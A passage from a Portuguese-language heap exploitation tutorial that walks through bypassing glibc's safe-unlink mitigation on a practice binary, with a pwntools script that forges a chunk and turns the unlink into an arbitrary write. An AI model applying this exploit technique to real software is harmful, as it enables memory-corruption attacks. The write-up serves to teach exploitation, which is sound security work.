                <span class="n">p</span><span class="o">-&gt;</span><span class="n">bk_mextsize</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">fd</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="n">p</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="p">;</span>
            <span class="n">p</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>As partes deste código iniciadas pela função <code class="language-plaintext highlighter-rouge">malloc_printerr()</code> fazem parte da mitigação da exploração de <code class="language-plaintext highlighter-rouge">Unsafe Unlink</code> que abortam a execução quando um processo de comparação falha. O que interessa no momento, é a segunda checagem chamada de <code class="language-plaintext highlighter-rouge">safe unlinkink check</code> representada pelo trecho do código abaixo.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">fd</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">!=</span> <span class="n">p</span> <span class="o">||</span> <span class="n">bk</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">!=</span> <span class="n">p</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
        <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">"corrupted double-linked list"</span><span class="p">);</span>
</code></pre></div></div>
<p>Este trecho, certifica que o <em>chunk</em> que está sendo desvinculado realmente faz parte de uma lista duplamente ligada. Abaixo, segue uma representação abstrata do processo efetuado por este código.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_214.png" alt="Checagem de unlink" /></p>

<p>Onde o “<code class="language-plaintext highlighter-rouge">p</code>” representa o <em>chunk</em> que está sendo liberado contendo seus “fd” e “bk” respectivamente.<br />
O processo irá abortar caso uma das duas opções ocorra:</p>

<ol>
  <li>Seguindo o “fd” do <em>chunk</em> sendo liberado, o “bk” encontrado não aponta de volta para o <em>chunk</em> sendo liberado, conforme ilustrado abaixo.</li>
</ol>

<p><img src="/img/papers/heap_p1/paper_heap1_215.png" alt="Checagem de unlink" /></p>

<ol>
  <li>Seguino o “bk” do <em>chunk</em> sendo liberado, o “fd” encontrado não aponta de volta para o <em>chunk</em> sendo liberado, conforme ilustrado abaixo.</li>
</ol>

<p><img src="/img/papers/heap_p1/paper_heap1_216.png" alt="Checagem de unlink" /></p>

<p>Olhando a perspectiva desta mitigação, poderiamos efetuar o <em>bypass</em> simplesmente passando o “fd” e “bk” forjado com o mesmo endereço do <em>chunk</em> que estamos liberando, pois forçaria os <em>chunks</em> adjacentes a terem os <em>pointers</em> corretos.<br />
No entanto, isso exigiria não só o vazamento do endereço da <em>heap</em>, que não temos neste binário, quando tornaria nossa escrita refletida inútil, pois poderíamos sobrescrever somente o <em>user data</em> do nosso próprio <em>chunk</em> sendo liberado.</p>

<p>Por tanto, com as mitigações ativas, é necessário encontrar outro alvo para a escrita refletida, que consiga passar pelo processo de <em>safe unlinking</em> e fornecer o que precisamos.</p>

<p>Conforme já temos visto sobre o funcionamento da malloc, uma das suas otimizações é que ela não rastreia os <em>chunks</em> alocados. Ao invés disso, ela mantém os <em>top chinks</em> e <em>top free chunks</em> em suas respectivas arenas, mas quando um <em>chunk</em> é alocado por uma <em>thread</em>, esta <em>thread</em> mantém uma referência para o <em>chunk</em> até que ele retorne para a malloc através de alguma função, como a <code class="language-plaintext highlighter-rouge">free()</code>.</p>

<p>Isto significa que o programa <strong>precisa</strong> armazenar os apontadores para todos os <em>chunks</em> em algum lugar, que pode ser na <em>stack</em>, em seu <em>data section</em> ou até mesmo manter na própria <em>heap</em>.</p>

<h3 id="arbitrary-write-via-safe-unlink">Arbitrary write via Safe Unlink</h3>

<p>Os binários que utilizamos até o momento, mantém os <em>chunk pointers</em> na <em>stack</em>, onde não somos capazes de adulterá-los por não ter um vazamento de endereço da <em>stack</em>.</p>

<blockquote>
  <p>Todo o comprimento da <em>stack</em> pode ser acessado e consultado através do GDB.</p>
</blockquote>

<p>Podemos vasculhar as áreas desse binário para encontrar alguma posição que nos dê vantagem.<br />
Ao iniciar o programa no GDB, podemos inspecionar suas áreas, antes de executá-lo, com o comando <code class="language-plaintext highlighter-rouge">info files</code>, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_217.png" alt="Visualizando as áreas do binário" /></p>

<p>Conforme podemos observar, o <em>range</em> da área <code class="language-plaintext highlighter-rouge">.bss</code> é bem pequeno, sendo de <code class="language-plaintext highlighter-rouge">0x40</code> bytes. Esta área, assim como a <code class="language-plaintext highlighter-rouge">.data</code>, pode conter variáveis que o binário utiliza.<br />
Com o comando <code class="language-plaintext highlighter-rouge">u</code>, podemos fazer o <code class="language-plaintext highlighter-rouge">disassembly</code> desta área para checar suas instruções, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_218.png" alt="Disassembly do .bss" /></p>

<p>Como podemos ver, no endereço <code class="language-plaintext highlighter-rouge">0x602060</code> aparentemente existe uma variável chamada <code class="language-plaintext highlighter-rouge">m_array</code>. Podemos checar seu conteúdo com o comando <code class="language-plaintext highlighter-rouge">print</code>, conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_219.png" alt="Conteúdo da m_array" /></p>

<p>O formato desta variável parece interessante, aparentemente ela guarda o <em>user data</em> e o <em>size field</em> dos dois <em>chunks</em> que podemos solicitar. Podemos confirmar isso, executando o programa, solicitando um <em>chunk</em>, populando seu <em>user data</em> e inspecionando esta variável novamente.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_220.png" alt="Criando um chunk e populando" /></p>

<p>Com o <em>chunk</em> criado, vamos inspecionar a variável <code class="language-plaintext highlighter-rouge">m_array</code> novamente conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_221.png" alt="Conteúdo da m_array" /></p>

<p>E podemos confirmar que esta variável faz exatamente o que aparenta. Portanto, este binário em específico, armazena seus <em>chunk pointers</em> no <em>data section</em> do próprio binário, e o mais importante: ele salva o endereço do <em>user data</em> do <em>chunk</em>, este <em>pointer</em> é usado pelo programa, quando as funções <code class="language-plaintext highlighter-rouge">free()</code> e <code class="language-plaintext highlighter-rouge">edit()</code> são chamadas. Podemos confirmar com o comando <code class="language-plaintext highlighter-rouge">vis</code> que nos mostra o mesmo endereço no <em>user data</em> do <em>chunk</em> criado.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_222.png" alt="Heap" /></p>

<p>Como este binário foi compilado sem o <code class="language-plaintext highlighter-rouge">PIE</code>, sabemos o exato endereço da <code class="language-plaintext highlighter-rouge">m_array</code> em tempo de execução.</p>

<p>Entendemos que uma forma de passar pela checagem do <em>safe unlink</em> é utilizar <em>pointers</em> para o <em>chunk</em> que está sendo desvinculado, e a <code class="language-plaintext highlighter-rouge">m_array</code> nos dá um <em>pointer</em> para este <em>chunk</em>.<br />
Se forjarmos nossos “fd” e “bk” de forma que este <em>pointer</em> na <code class="language-plaintext highlighter-rouge">m_array</code> se torne ambos, “fd” do <em>chunk</em> apontado pelo nosso “fd” e o “bk” desse <em>chunk</em> apontado pelo nosso “bk”, conseguiremos passar pelo <em>safe unlink</em>.</p>

<p>Além disso, nossa escrita refletida, sobrescreverá a entrada do <code class="language-plaintext highlighter-rouge">m_array</code> com nosso “fd” forjado, que será seu próprio endereço, menos 24.<br />
Uma vez que isso aconteça, a opção <code class="language-plaintext highlighter-rouge">edit</code> do binário, pode ser usada para sobrescrever a <code class="language-plaintext highlighter-rouge">m_array</code> com mais controle, levando a uma escrita arbitrária no binário.</p>

<p>Para colocar em ordem todos os movimentos necessários, vamos criar o script <code class="language-plaintext highlighter-rouge">arbitrary_write.py</code> para iniciar a exploração. O modelo inicial do script fica desta forma:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1"># configurando o binario e a GLIBC
</span><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"safe_unlink"</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">runpath</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"/libc.so.6"</span><span class="p">)</span> <span class="c1"># elf.libc broke again
</span>
<span class="c1"># GDB config
</span><span class="n">gs</span> <span class="o">=</span> <span class="s">'''
continue
'''</span>

<span class="c1"># funcao para iniciar
</span><span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gs</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">process</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">)</span>

<span class="c1"># indice do chunk alocado
</span><span class="n">index</span> <span class="o">=</span> <span class="mi">0</span>

<span class="c1"># seleciona a funcao "malloc", envia o tamanho e os dados e retorna o indice do chunk
</span><span class="k">def</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
    <span class="k">global</span> <span class="n">index</span>
    <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"size: "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">size</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>
    <span class="n">index</span> <span class="o">+=</span> <span class="mi">1</span>
    <span class="k">return</span> <span class="n">index</span> <span class="o">-</span> <span class="mi">1</span>

<span class="c1"># seleciona a funcao "edit" e envia os dados para o chunk.
</span><span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
    <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"2"</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"index: "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">index</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"data: "</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>

<span class="c1"># seleciona a opcao "free" e envia o indice.
</span><span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
    <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"3"</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"index: "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">index</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>

<span class="c1"># capturando o endereco da puts() que o binario vaza
</span><span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"puts() @ "</span><span class="p">)</span>
<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">puts</span>
<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">timeout</span> <span class="o">=</span> <span class="mf">0.1</span>

<span class="c1">#===============EXPLOITING================#
</span>

<span class="c1">#=========================================#
</span>
<span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p>Este script, assim como os demais contém funções auxiliares para iterar entre as opções do menu do binário.
Para iniciar o bloco de exploração, vamos iniciar solicitando dois <em>chunks</em>, “A” e “B”. Depois podemos forjar um “fd” com o endereço da <code class="language-plaintext highlighter-rouge">m_array - 24</code>, assim a malloc vai pensar que o “bk” do <em>chunk</em> estará lá, como este endereço é um <em>quadword</em> de alinhamento, a primeira entrada da <code class="language-plaintext highlighter-rouge">m_array</code> será considerada um “fd”.<br />
Faremos a mesma coisa com a “bk” forjada, apontando para <code class="language-plaintext highlighter-rouge">m_array - 16</code> que também é um <em>quadword</em> de alinhamento, fazendo a primeira entrada da <code class="language-plaintext highlighter-rouge">m_arrray</code> ser considerada o “fd” do <em>chunk</em> falso. O bloco de exploração fica desta forma:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#===============EXPLOITING================#
</span>
<span class="c1"># requisitando 2 chunks
</span><span class="n">chunk_A</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x88</span><span class="p">)</span>
<span class="n">chunk_B</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x88</span><span class="p">)</span>

<span class="c1"># criando variaveis
</span><span class="n">fd</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">m_array</span> <span class="o">-</span> <span class="mi">24</span>
<span class="n">bk</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">m_array</span> <span class="o">-</span> <span class="mi">16</span>
<span class="n">prev_size</span> <span class="o">=</span> <span class="mh">0x90</span>
<span class="n">fake_size</span> <span class="o">=</span> <span class="mh">0x90</span>

<span class="c1"># sobrescrevendo a m_array
</span><span class="n">edit</span><span class="p">(</span><span class="n">chunk_A</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bk</span><span class="p">)</span> <span class="o">+</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mh">0x70</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">prev_size</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_size</span><span class="p">))</span>

<span class="c1">#=========================================#
</span></code></pre></div></div>
<p>Com as edições feitas, podemos executar nosso script com as opções do GDB, pausar e checar a <em>heap</em> e a <code class="language-plaintext highlighter-rouge">m_array</code>, conforme a imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_223.png" alt="Chunk forjado" /></p>

<p>Podemos ver que a primeira entrada da <code class="language-plaintext highlighter-rouge">m_array</code> aponta para o endereço do <em>user data</em> do <em>chunk</em> A, conforme o comportamento normal do programa, marcado em vermelho.<br />
Nossa “fd” forjada aponta para um <em>quadword</em> de alinhamento, marcado em azul, fazendo com que a instrução seja passada até a primeira entrada da <code class="language-plaintext highlighter-rouge">m_array</code>, fazendo com que a “bk” do <em>chunk</em> falso, aponte de volta para o <em>chunk</em> A.<br />
Isso completa a primeira parte do processo de checagem do <em>safe unlinking</em>.<br />
Nossa “bk” forjada também aponta para um <em>quadword</em> de alinhamento, marcado em verde, que fará com que a execução passe por ele e considere a primeira entrada da <code class="language-plaintext highlighter-rouge">m_array</code> como sendo válida, e também aponta para o endereço do <em>chunk</em> A, tornando o “fd” do chunk falso, válido.<br />
Isso completa o processo de checagem do <em>safe unlinking</em>.</p>

<p>Porém se continuarmos a execução do programa e tentarmos liberar o <em>chunk</em> B, receberemos uma mensagem de erro, conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_224.png" alt="Mensagem de erro" /></p>

<p>Isso acontece, pois algo importante não foi levado em consideração. A malloc lida com <em>chunks</em> utilizando <em>metadata pointers</em>, e não <em>pointes</em> para o <em>user data</em> conforme fizemos. Nossos “fk” e “bk” forjados, apontam para o campo <em>user data</em>, ou seja, 16 bytes após o campo com os metadados, necessários para passar pela checagem. Podemos ver no <em>frame unlink chunk</em> que a última chamada feita por esta função foi feita logo após a checagem, conforme mostrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_225.png" alt="Metadados inválidos" /></p>

<p>Para contornar esta falha, primeiro temos que relembrar como a malloc liberou o <em>chunk</em> A. Nós forjamos um <code class="language-plaintext highlighter-rouge">prev_size field</code> no <em>chunk</em> B, para levar a malloc até o início do <em>chunk</em> A adicionando em seu valor <code class="language-plaintext highlighter-rouge">0x90</code> bytes.</p>

<p>Isso significa que podemos forjar esse <code class="language-plaintext highlighter-rouge">prev_size field</code> para convencer a malloc de que nosso <em>chunk</em> A se inicia no endereço em que está o seu <em>user data</em>. Para isso, podemos subtrair 16 bytes do campo forjado. Mas, isto também vai exigir novas alterações na estrutura do <em>chunk</em> que será liberado, de forma que vamos “construir” um <em>chunk</em>. Em ordem, precisamos:</p>

<ol>
  <li>Subtrair 16 bytes do <code class="language-plaintext highlighter-rouge">prev_size field</code> para forçar a malloc a considerar o campo <em>user data</em> como sendo o início do chunk.</li>
  <li>Adicionar um <em>quadword</em> nulo como <code class="language-plaintext highlighter-rouge">prev_size</code> para indicarmos que o <em>chunk</em> anterior, que não existe, está em uso.</li>
  <li>Criar um <em>size field</em> falso para o <em>chunk</em> que estamos construindo, porém, como vamos construir o <em>chunk</em> dentro de um já existente de <code class="language-plaintext highlighter-rouge">0x90</code> bytes de tamanho, precisamos ajustar seu tamanho para <code class="language-plaintext highlighter-rouge">0x80</code> bytes (<code class="language-plaintext highlighter-rouge">0x90</code> menos 16 bytes).</li>
  <li>Por último, precisamos diminuir a quantidade de lixo enviado para o <em>chunk</em> afim de alinharmos o decremento de 16 bytes.</li>
</ol>

<p>Para fins de comparação, a linha de código anterior ficará disponível no bloco de exploração, porém comentada conforme abaixo:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#===============EXPLOITING================#
</span>
<span class="c1"># requisitando 2 chunks
</span><span class="n">chunk_A</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x88</span><span class="p">)</span>
<span class="n">chunk_B</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x88</span><span class="p">)</span>

<span class="c1"># criando variaveis
</span><span class="n">fd</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">m_array</span> <span class="o">-</span> <span class="mi">24</span>
<span class="n">bk</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">m_array</span> <span class="o">-</span> <span class="mi">16</span>
<span class="n">prev_size</span> <span class="o">=</span> <span class="mh">0x80</span>
<span class="n">fake_size</span> <span class="o">=</span> <span class="mh">0x90</span>

<span class="c1"># sobrescrevendo a m_array (forma com erro)
#edit(chunk_A, p64(fd) + p64(bk) + p8(0)*0x70 + p64(prev_size) + p64(fake_size))
</span>
<span class="c1"># sobrescrevendo a m_array com um chunk "construido"
</span><span class="n">edit</span><span class="p">(</span><span class="n">chunk_A</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bk</span><span class="p">)</span> <span class="o">+</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mh">0x60</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">prev_size</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_size</span><span class="p">))</span>

<span class="c1">#=========================================#
</span></code></pre></div></div>
<p>Ao executar o script com as opções do GDB, podemos consultar o que a malloc vê quando segue o “fd” com uma chamada para sua estrutura, conforme mostrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_226.png" alt="Chunk construído" /></p>

<p>Como podemos observar, o “bk” do <em>chunk</em> para o qual estamos apontando, aponta de volta para o início do nosso <em>chunk</em> construído, o que é suficiente para passar pela primeira parte da checagem do <em>safe unlinking</em>.<br />
Seguindo nosso “bk” forjado, vemos que o “fd” do <em>chunk</em> para o qual fomos direcionados, também aponta de volta para nosso <em>chunk</em> construído, o que é suficiente para passar pela segunda parte da checagem do <em>safe unlinking</em>.</p>

<blockquote>
  <p>A linha de código <code class="language-plaintext highlighter-rouge">((struct malloc_chunk*)0x603010).fd</code> simplesmente trata nosso <em>chunk</em> falso como uma estrutura da <code class="language-plaintext highlighter-rouge">malloc_chunk</code> e segue seu “fd”</p>
</blockquote>

<p>Agora, quando liberamos o <em>chunk</em> B, não recebemos nenhuma mensagem de erro, conforme mostrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_227.png" alt="Liberando o chunk B" /></p>

<p>Agora podemos voltar ao GDB e consultar a <em>heap</em>, porém, como ela está corrompida, o comando <code class="language-plaintext highlighter-rouge">vis</code> não vai mostrar o que precisamos, em seu lugar, podemos usar o <code class="language-plaintext highlighter-rouge">dq</code>, para consultarmos o início da <em>heap</em>, conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_228.png" alt="Heap" /></p>

<p>O comando <code class="language-plaintext highlighter-rouge">top_chunk</code> nos mostra que o <em>chunk</em> B foi consolidado não só com nosso <em>chunk</em> construído, mas também com o <em>top chunk</em>. E como nosso <em>chunk</em> construído foi consolidado, ele também sofreu o processo de <em>unlinking</em>, o que significa que conseguimos a escrita refletida.</p>

<p>Extraindo o <em>dump</em> da memória ao redor da <code class="language-plaintext highlighter-rouge">m_array</code> podemos ver que a primeira entrada da <code class="language-plaintext highlighter-rouge">m_array</code> não aponta mais para a <em>heap</em>, mas para o endereço 24 bytes antes dela própria, conforma mostrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_229.png" alt="m_array sobrescrita" /></p>

<p>Isto conclui a segunda parte do processo de <em>unlinking</em>, no qual nosso “bk” forjado foi seguido, e nosso “fd” forjado sobrescreveu o “fd” no destino. Podemos confirmar isso, comparando o <em>dump</em> da <em>heap</em> com o <em>dump</em> da <code class="language-plaintext highlighter-rouge">m_array</code>, onde vemos que a primeira entrada do <code class="language-plaintext highlighter-rouge">m_array</code> é idêntica ao nosso “fd”, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_230.png" alt="Fd e m_array idênticas" /></p>

<p>Agora se editarmos o <em>chunk</em> de índice zero, estaremos editando a própria <code class="language-plaintext highlighter-rouge">m_array</code> pela segunda vez com nossos próprios dados.</p>

<p>A partir de agora, seguindo nosso fluxo de alterações, para conseguirmos uma escrita arbitrária no binário, precisamos adicionar os seguintes comandos ao nosso script:</p>

<ol>
  <li>Temos que liberar o <em>chunk</em> B da mesma forma que fizemos manualmente, ativando a consolidação do nosso <em>chunk</em> construído e o desvinculando.</li>
  <li>Neste ponto, o índice zero aponta para três <em>quadwords</em> antes da primeira entrada da <code class="language-plaintext highlighter-rouge">m_array</code>, então, podemos utilizar a função <code class="language-plaintext highlighter-rouge">edit()</code> do nosso script para enviar os três <em>quadwords</em> nulos seguidos do endereço que queremos chegar, neste caso, o endereço da <em>target</em>.</li>
  <li>Agora a primeira entrada da <code class="language-plaintext highlighter-rouge">m_array</code> aponta para a <em>target</em> e podemos usar a função <code class="language-plaintext highlighter-rouge">edit()</code> novamente no índice zero e sobrescrever o conteúdo da <em>target</em>.</li>
</ol>

<p>O resultado do bloco de exploração fica desta forma:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#===============EXPLOITING================#
</span>
<span class="c1"># requisitando 2 chunks
</span><span class="n">chunk_A</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x88</span><span class="p">)</span>
<span class="n">chunk_B</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x88</span><span class="p">)</span>

<span class="c1"># criando variaveis
</span><span class="n">fd</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">m_array</span> <span class="o">-</span> <span class="mi">24</span>
<span class="n">bk</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">m_array</span> <span class="o">-</span> <span class="mi">16</span>
<span class="n">prev_size</span> <span class="o">=</span> <span class="mh">0x80</span>
<span class="n">fake_size</span> <span class="o">=</span> <span class="mh">0x90</span>

<span class="c1"># sobrescrevendo a m_array (forma com erro)
#edit(chunk_A, p64(fd) + p64(bk) + p8(0)*0x70 + p64(prev_size) + p64(fake_size))
</span>
<span class="c1"># sobrescrevendo a m_array com um chunk "construido"
</span><span class="n">edit</span><span class="p">(</span><span class="n">chunk_A</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bk</span><span class="p">)</span> <span class="o">+</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mh">0x60</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">prev_size</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_size</span><span class="p">))</span>

<span class="c1"># liberando o chunkB e ativando o unlinking dos chunks
</span><span class="n">free</span><span class="p">(</span><span class="n">chunk_B</span><span class="p">)</span>

<span class="c1"># sobrescrevendo a primeira entrada do m_array com o endereco da target
</span><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">target</span><span class="p">))</span>

<span class="c1"># sobrescrevendo o conteudo da target
</span><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s">"BecoXPL"</span><span class="p">)</span>

<span class="c1">#=========================================#
</span></code></pre></div></div>
<p>Agora executando nosso script e selecionando a opção quatro do menu do binário, comprovamos a escrita arbitrária, conforme mostrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_231.png" alt="Escrita arbitrária" /></p>

<blockquote>
  <p>Em resumo, requisitamos dois <em>chunks</em>, “A” e “B” e aproveitamos da vulnerabilidade de <em>overflow</em> no binário para retirar a <em>flag</em> <code class="language-plaintext highlighter-rouge">prev_inuse</code> no <em>chunk</em> B.<br />
Também construímos um <em>chunk</em> falso sobre o <em>chunk</em> A, incluindo todos os seus campos, como <code class="language-plaintext highlighter-rouge">size field</code>, “fd” e “bk” e um <code class="language-plaintext highlighter-rouge">prev_size</code>.<br />
Quando liberamos o <em>chunk</em> B, a <em>flag</em> <code class="language-plaintext highlighter-rouge">prev_inuse</code> inexistente indicou para a malloc que o <em>chunk</em> A não estava em uso, mesmo que não estivesse, o tornando um candidato a consolidação.<br />
A malloc utilizou o <code class="language-plaintext highlighter-rouge">prev_size field</code> do <em>chunk</em> B para encontrar o início do <em>chunk</em> A para efetuar a consolidação.<br />
Configuramos o <code class="language-plaintext highlighter-rouge">prev_size field</code> do <em>chunk</em> B com o tamanho do <em>chunk</em> A, menos 16, fazendo a malloc acreditar que o <em>chunk</em> A se iniciava no primeiro <em>quadword</em> do <em>user data</em> onde forjamos os metadados do <em>chunk</em> construído.<br />
